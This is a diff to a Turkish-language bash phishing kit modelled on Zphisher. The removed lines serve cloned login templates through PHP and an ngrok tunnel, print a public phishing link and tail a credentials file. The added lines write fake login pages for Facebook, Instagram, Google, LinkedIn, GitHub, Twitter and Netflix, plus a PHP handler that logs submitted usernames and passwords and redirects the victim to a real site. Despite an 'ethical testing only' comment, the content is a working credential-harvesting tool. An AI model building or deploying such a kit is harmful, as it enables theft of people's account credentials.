@@ -1,99 +1,193 @@
 #!/bin/bash
 
-# Eğitim amaçlı basit bir phishing aracı (Zphisher benzeri)
-# YASA DIŞI KULLANIM İÇİN TASARLANMAMIŞTIR. SADECE ETİK TESTLER İÇİNDİR.
+# ... (Önceki kısımlar aynı kalır, sadece menü ve şablonlar güncellenir)
 
-# Renkler
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-CYAN='\033[0;36m'
-NC='\033[0m'
-
-# Bağımlılıklar
-dependencies=("php" "wget" "unzip" "curl")
-
-# Bağımlılık kontrolü
-check_deps() {
-  for dep in "${dependencies[@]}"; do
-    if ! command -v "$dep" &> /dev/null; then
-      echo -e "${RED}[!] Hata: $dep kurulu değil.${NC}"
-      exit 1
-    fi
-  done
+# Menü gösterimi
+show_menu() {
+    echo -e "${GREEN}"
+    echo "------------ FISHING DEMO ------------"
+    echo "1. Facebook"
+    echo "2. Instagram"
+    echo "3. Google"
+    echo "4. LinkedIn"
+    echo "5. GitHub"
+    echo "6. Twitter"
+    echo "7. Netflix"
+    echo "8. Çıkış"
+    echo "--------------------------------------"
+    echo -e "${NC}"
 }
 
-# Temizlik
-cleanup() {
-  echo -e "\n${GREEN}[+] Temizlik yapılıyor...${NC}"
-  killall php > /dev/null 2>&1
-  killall ngrok > /dev/null 2>&1
-  rm -rf sites/
-}
-
-# Menü
-menu() {
-  clear
-  echo -e "${CYAN}
-   ███████╗██████╗ ██╗  ██╗██╗███████╗
-   ╚══███╔╝██╔══██╗██║  ██║██║██╔════╝
-     ███╔╝ ██████╔╝███████║██║███████╗
-    ███╔╝  ██╔═══╝ ██╔══██║██║╚════██║
-   ███████╗██║     ██║  ██║██║███████║
-   ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝
-  ${NC}"
-  echo -e "${GREEN}[1] Facebook"
-  echo -e "[2] Google"
-  echo -e "[3] Instagram"
-  echo -e "[4] Çıkış${NC}"
-  read -p "Seçim yapın: " choice
-
-  case $choice in
-    1) setup "facebook";;
-    2) setup "google";;
-    3) setup "instagram";;
-    4) cleanup && exit;;
-    *) echo -e "${RED}Geçersiz seçim!${NC}"; sleep 1; menu;;
-  esac
-}
-
-# Site kurulumu
-setup() {
-  site=$1
-  echo -e "\n${GREEN}[+] $site klonlanıyor...${NC}"
-  mkdir -p sites/$site
-  case $site in
-    "facebook") template_url="https://github.com/example/facebook-phishing/archive/main.zip";;
-    "google") template_url="https://github.com/example/google-phishing/archive/main.zip";;
-    "instagram") template_url="https://github.com/example/instagram-phishing/archive/main.zip";;
-  esac
-  
-  wget -q "$template_url" -O sites/$site/temp.zip
-  unzip -q sites/$site/temp.zip -d sites/$site/
-  rm sites/$site/temp.zip
-  start_server $site
-}
-
-# Sunucu ve tünel başlatma
-start_server() {
-  site=$1
-  echo -e "\n${GREEN}[+] PHP sunucusu başlatılıyor...${NC}"
-  php -S 127.0.0.1:8080 -t sites/$site/ > /dev/null 2>&1 &
-  sleep 2
-  
-  echo -e "\n${CYAN}[+] Tünel başlatılıyor (ngrok)...${NC}"
-  ngrok http 8080 > /dev/null 2>&1 &
-  sleep 5
-  
-  # Ngrok URL'sini al
-  ngrok_url=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
-  echo -e "\n${GREEN}[+] Phishing Linki: $ngrok_url ${NC}"
-  
-  # Kimlik bilgilerini izleme
-  echo -e "\n${CYAN}[+] Kimlik bilgileri bekleniyor...${NC}"
-  tail -f sites/$site/credentials.txt
-}
+# ... (Diğer fonksiyonlar aynı)
 
 # Ana işlem
 trap cleanup EXIT
 check_deps
-menu
+
+while true; do
+    show_menu
+    read -p "Seçenek: " choice
+
+    case $choice in
+        1)
+            echo -e "${CYAN}[*] Facebook şablonu hazırlanıyor...${NC}"
+            cat <<EOF > index.html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook Login</title>
+</head>
+<body>
+    <h1>Facebook'a Giriş Yap</h1>
+    <form action="submit.php" method="POST">
+        <input type="text" name="email" placeholder="E-posta">
+        <input type="password" name="pass" placeholder="Şifre">
+        <button type="submit">Giriş Yap</button>
+    </form>
+</body>
+</html>
+EOF
+            ;;
+
+        2)
+            echo -e "${CYAN}[*] Instagram şablonu hazırlanıyor...${NC}"
+            cat <<EOF > index.html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram Login</title>
+</head>
+<body>
+    <h1>Instagram'a Giriş Yap</h1>
+    <form action="submit.php" method="POST">
+        <input type="text" name="username" placeholder="Kullanıcı Adı">
+        <input type="password" name="pass" placeholder="Şifre">
+        <button type="submit">Giriş Yap</button>
+    </form>
+</body>
+</html>
+EOF
+            ;;
+
+        3)
+            echo -e "${CYAN}[*] Google şablonu hazırlanıyor...${NC}"
+            cat <<EOF > index.html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Google Giriş</title>
+</head>
+<body>
+    <h1>Google Hesabınıza Giriş Yapın</h1>
+    <form action="submit.php" method="POST">
+        <input type="email" name="email" placeholder="E-posta veya telefon">
+        <input type="password" name="pass" placeholder="Şifre">
+        <button type="submit">Sonraki</button>
+    </form>
+</body>
+</html>
+EOF
+            ;;
+
+        4)
+            echo -e "${CYAN}[*] LinkedIn şablonu hazırlanıyor...${NC}"
+            cat <<EOF > index.html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>LinkedIn Giriş</title>
+</head>
+<body>
+    <h1>LinkedIn'e Giriş Yap</h1>
+    <form action="submit.php" method="POST">
+        <input type="text" name="email" placeholder="E-posta">
+        <input type="password" name="pass" placeholder="Şifre">
+        <button type="submit">Giriş</button>
+    </form>
+</body>
+</html>
+EOF
+            ;;
+
+        5)
+            echo -e "${CYAN}[*] GitHub şablonu hazırlanıyor...${NC}"
+            cat <<EOF > index.html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>GitHub Giriş</title>
+</head>
+<body>
+    <h1>GitHub'a Giriş Yap</h1>
+    <form action="submit.php" method="POST">
+        <input type="text" name="username" placeholder="Kullanıcı Adı">
+        <input type="password" name="pass" placeholder="Şifre">
+        <button type="submit">Giriş</button>
+    </form>
+</body>
+</html>
+EOF
+            ;;
+
+        6)
+            echo -e "${CYAN}[*] Twitter şablonu hazırlanıyor...${NC}"
+            cat <<EOF > index.html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Twitter Giriş</title>
+</head>
+<body>
+    <h1>Twitter'a Giriş Yap</h1>
+    <form action="submit.php" method="POST">
+        <input type="text" name="username" placeholder="Kullanıcı Adı">
+        <input type="password" name="pass" placeholder="Şifre">
+        <button type="submit">Giriş</button>
+    </form>
+</body>
+</html>
+EOF
+            ;;
+
+        7)
+            echo -e "${CYAN}[*] Netflix şablonu hazırlanıyor...${NC}"
+            cat <<EOF > index.html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Netflix Giriş</title>
+</head>
+<body>
+    <h1>Netflix'e Giriş Yap</h1>
+    <form action="submit.php" method="POST">
+        <input type="email" name="email" placeholder="E-posta">
+        <input type="password" name="pass" placeholder="Şifre">
+        <button type="submit">Giriş Yap</button>
+    </form>
+</body>
+</html>
+EOF
+            ;;
+
+        8)
+            echo -e "${RED}[!] Çıkılıyor...${NC}"
+            exit 0
+            ;;
+
+        *)
+            echo -e "${RED}[!] Geçersiz seçenek!${NC}"
+            ;;
+    esac
+
+    # Submit.php dosyası (Aynı kalır)
+    cat <<EOF > submit.php
+<?php
+\$data = "Email/Kullanıcı Adı: " . \$_POST['email'] . " | Şifre: " . \$_POST['pass'] . "\n";
+file_put_contents('data.txt', \$data, FILE_APPEND);
+header('Location: https://example.com'); // Gerçek siteye yönlendirme
+?>
+EOF
+
+    start_server
+    capture_data
+done
